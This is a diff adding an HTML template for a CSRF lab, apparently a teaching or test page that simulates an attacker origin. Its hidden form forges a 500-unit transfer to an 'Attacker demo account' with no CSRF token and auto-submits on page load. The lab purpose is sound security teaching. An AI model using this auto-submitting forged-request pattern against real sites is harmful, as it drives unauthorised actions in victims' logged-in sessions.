@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Untrusted attacker page — CSRF lab</title></head>
+<body>
+  <h1>{{ heading }}</h1>
+  <p>This page simulates an attacker-controlled origin. Its form submits automatically.</p>
+  <form id="forged" method="post" action="{{ target_url }}">
+    <input type="hidden" name="recipient" value="Attacker demo account">
+    <input type="hidden" name="amount" value="500">
+    <!-- Intentionally no csrf_token field: this is the forged request. -->
+    <noscript><button type="submit">Submit forged request</button></noscript>
+  </form>
+  <script>document.getElementById("forged").submit();</script>
+</body>
+</html>
